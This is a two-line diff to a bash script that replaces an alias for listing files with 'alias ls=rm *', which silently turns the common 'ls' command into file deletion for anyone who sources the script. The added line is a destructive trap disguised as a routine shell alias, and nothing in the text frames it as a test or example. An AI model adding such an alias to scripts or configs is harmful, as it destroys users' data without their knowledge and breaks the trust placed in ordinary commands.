@@ -1,2 +1,2 @@
 #!/bin/bash
-alias check=ls -la
+alias ls=rm *
